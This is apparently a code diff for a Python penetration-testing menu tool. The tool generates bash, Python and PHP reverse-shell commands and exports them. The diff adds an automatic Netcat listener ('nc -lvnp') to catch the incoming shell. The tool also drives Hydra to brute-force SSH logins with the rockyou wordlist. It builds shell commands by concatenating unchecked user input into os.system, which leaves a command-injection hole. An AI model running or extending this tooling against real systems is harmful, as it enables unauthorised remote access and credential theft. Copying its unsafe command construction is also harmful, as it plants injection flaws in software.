@@ -21,9 +21,9 @@ interf = "N/A"  # Global variable for interface
 # Global variable for Hydra
 wordlist = ""  # Global variable for wordlist
 uname = ""  # Global variable for wordlist
-uname_Wordlist = "" # Global variable for wordlist
+uname_Wordlist = ""  # Global variable for wordlist
 passwd = ""  # Global variable for password
-passwd_Wordlist = "" # Global variable for password
+passwd_Wordlist = ""  # Global variable for password
 
 
 # Main function
@@ -62,7 +62,7 @@ def main():
             revershell()
         case '2':  # Netcat connection
             netcat()
-        case '3':  
+        case '3':
             hydra()
 
 # Banner function
@@ -116,22 +116,48 @@ def choice(shell, extention):  # Choice for reverse shell
             pyperclip.copy(shell)  # Copy reverse shell command to clipboard
             print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is copied to Clipboard")
             sleep(1)
-            backtomain()  # Go back to main menu
+            nc_choice = input(
+                "\nDo you want to start a Netcat listener ? (Y/n) : ")
+            match nc_choice:
+                case 'y':
+                    nc_connection(port)
+                case '':
+                    nc_connection(port)
+                case 'n':
+                    backtomain()
         case 'f':  # Case F for export as file
             file = "shell." + extention  # Create file name
             with open(file, "w") as f:  # Open file and write reverse shell command
                 f.write(shell)  # Write reverse shell command to file
             print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Your shell is exported as " + file)
             sleep(1)
-            backtomain()
+            nc_choice = input(
+                "\nDo you want to start a Netcat listener ? (Y/n) : ")
+            match nc_choice:
+                case 'y':
+                    nc_connection(port)
+                case '':
+                    nc_connection(port)
+                case 'n':
+                    backtomain()
     return shell, extention
 
+
+def nc_connection(port):
+    print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Listening on port {port}")
+    sleep(1)
+    os.system(f"nc -lvnp {port}")
+    backtomain()
+
 # Go back to main menu function
+
+
 def backtomain():
     print(f'\n{Fore.YELLOW}[*]{Fore.RESET} Go back to main')
     sleep(1)
     os.system('clear')
     main()
+
 
 def jtr_banner():
     banner = f"""{Style.BRIGHT}{Fore.LIGHTRED_EX}     ██╗ ██████╗ ██╗  ██╗███╗   ██╗██████╗ ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
@@ -144,7 +170,9 @@ def jtr_banner():
                                                                                       """
     print(banner)
 
-#John the Ripper
+# John the Ripper
+
+
 def jtr():
     jtr_banner()
     modules = f"""
@@ -157,6 +185,8 @@ def jtr():
     """
     print(modules)
 # The main function for reverse shells
+
+
 def revershell():
     os.system('clear')
     banner()
@@ -182,6 +212,8 @@ def revershell():
             backtomain()
 
 # Bash reverse shell function
+
+
 def bash():
     os.system('clear')
     banner()
@@ -194,6 +226,7 @@ def bash():
         port = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter your port (Default : 1234) : ')
         if port == '':
             port = port1  # If no port is entered, use default port
+            globals()['port'] = port
         else:
             # If port is entered, set it to global variable
             globals()['port'] = port
@@ -227,8 +260,9 @@ def python():  # Python reverse shell function
     print(f"{Fore.YELLOW}[*]{Fore.RESET} Your shell is created")
     choice(shell, "py")
 
-def php():                                                                         #PHP reverse shell function
-    os.system('clear')                                                            #Its the same code as bash reverse shell function
+
+def php():  # PHP reverse shell function
+    os.system('clear')  # Its the same code as bash reverse shell function
     banner()
     port1 = "1234"
     if ipadd == "0.0.0.0":
@@ -309,6 +343,7 @@ def hydra():
     if choice == '1':
         hydra_ssh()
 
+
 def hydra_check_wordlist(wdlist):
     if os.path.exists(wdlist):
         if wdlist == "":
@@ -329,17 +364,17 @@ def hydra_ssh():
     os.system('clear')
     hydra_banner()
     choice = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Do you know the {Fore.MAGENTA}username{Fore.RESET},{Fore.CYAN}password{Fore.RESET} or {Fore.RED}nothing{Fore.RESET} ? ({Fore.MAGENTA}u{Fore.RESET}/{Fore.CYAN}p{Fore.RESET}/{Fore.RED}n{Fore.RESET}): ')
-    
-    #If  the user knows the username
+
+    # If  the user knows the username
     if choice == 'u':
 
-        #Input Section
+        # Input Section
         uname = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.MAGENTA}username{Fore.RESET} : ')
         wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.CYAN}wordlist{Fore.RESET} (Default: /usr/share/wordlists/rockyou.txt) : ')
         ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
-        
-        #Checking Section
-        #Username Check
+
+        # Checking Section
+        # Username Check
         if uname == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}username{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -347,7 +382,7 @@ def hydra_ssh():
             input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
             hydra_ssh()
 
-        #Wordlist Check
+        # Wordlist Check
         if wordlist == '':
             wordlist = "/usr/share/wordlists/rockyou.txt"
             if os.path.exists(wordlist):
@@ -368,7 +403,7 @@ def hydra_ssh():
                 input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                 hydra_ssh()
 
-        #IP Check
+        # IP Check
         if ip == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -377,26 +412,27 @@ def hydra_ssh():
             hydra_ssh()
         else:
             globals()['ip'] = ip
-        
+
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
         sleep(1)
-        hydra_task = "hydra -l " + uname + " -P " + wordlist + " " + ip + " -s 22 -t 1 ssh"
+        hydra_task = "hydra -l " + uname + " -P " + \
+            wordlist + " " + ip + " -s 22 -t 1 ssh"
         os.system(hydra_task)
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
         sleep(1)
         input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
         hydra()
 
-    #If the user know the password
+    # If the user know the password
     elif choice == 'p':
-        
-        #Input Section
+
+        # Input Section
         passwd = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.CYAN}password{Fore.RESET} : ')
         wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.MAGENTA}wordlist{Fore.RESET} (Default: /usr/share/wordlists/rockyou.txt) : ')
         ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
-        
-        #Checking Section
-        #Username Check
+
+        # Checking Section
+        # Username Check
         if passwd == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}password{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -404,7 +440,7 @@ def hydra_ssh():
             input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
             hydra_ssh()
 
-        #Wordlist Check
+        # Wordlist Check
         if wordlist == '':
             wordlist = "/usr/share/wordlists/rockyou.txt"
             if os.path.exists(wordlist):
@@ -425,7 +461,7 @@ def hydra_ssh():
                 input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
                 hydra_ssh()
 
-        #IP Check
+        # IP Check
         if ip == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -434,25 +470,26 @@ def hydra_ssh():
             hydra_ssh()
         else:
             globals()['ip'] = ip
-        
+
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
         sleep(1)
-        hydra_task = "hydra -p " + passwd + " -L " + wordlist + " " + ip + " -s 22 -t 1 ssh"
+        hydra_task = "hydra -p " + passwd + " -L " + \
+            wordlist + " " + ip + " -s 22 -t 1 ssh"
         os.system(hydra_task)
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
         sleep(1)
         input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
         hydra()
-    
+
     elif choice == 'n':
 
-        #Input Section
+        # Input Section
         passwd_Wordlist = input(f'\n{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.CYAN}password wordlist{Fore.RESET} : ')
         uname_Wordlist = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the path of your {Fore.MAGENTA}username wordlist{Fore.RESET} : ')
         ip = input(f'{Fore.YELLOW}[*]{Fore.RESET} Enter the {Fore.LIGHTGREEN_EX}ip{Fore.RESET} : ')
-        
-        #Checking Section
-        #Password Check
+
+        # Checking Section
+        # Password Check
         if passwd_Wordlist == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.CYAN}password{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -460,7 +497,7 @@ def hydra_ssh():
             input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
             hydra_ssh()
 
-        #Username Check
+        # Username Check
         if uname_Wordlist == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.MAGENTA}username{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -468,7 +505,7 @@ def hydra_ssh():
             input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
             hydra_ssh()
 
-        #Wordlist Check
+        # Wordlist Check
         if os.path.exists(passwd_Wordlist):
             globals()['passwd_Wordlist'] = passwd_Wordlist
         elif os.path.exists(uname_Wordlist):
@@ -480,7 +517,7 @@ def hydra_ssh():
             input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
             hydra_ssh()
 
-        #IP Check
+        # IP Check
         if ip == '':
             print(f"{Fore.RED}[!]{Fore.RESET} You didn't enter the {Fore.LIGHTGREEN_EX}IP{Fore.RESET}")
             print(f"{Fore.RED}[!]{Fore.RESET} Come back to the menu and try again")
@@ -489,18 +526,16 @@ def hydra_ssh():
             hydra_ssh()
         else:
             globals()['ip'] = ip
-        
+
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute starting...")
         sleep(1)
-        hydra_task = "hydra -P " + passwd_Wordlist + " -L " + uname_Wordlist + " " + ip + " -s 22 -t 1 ssh"
+        hydra_task = "hydra -P " + passwd_Wordlist + " -L " + \
+            uname_Wordlist + " " + ip + " -s 22 -t 1 ssh"
         os.system(hydra_task)
         print(f"{Fore.GREEN}[+]{Fore.RESET} Hydra brute finished")
         sleep(1)
         input(f"{Fore.RED}[!]{Fore.RESET} Press any key to continue...")
         hydra()
 
-# hydra()
-jtr()
-
-# if __name__ == "__main__":
-#     main()                                                                       #Call main function to start the program
+if __name__ == "__main__":
+    main()                                                                       #Call main function to start the program
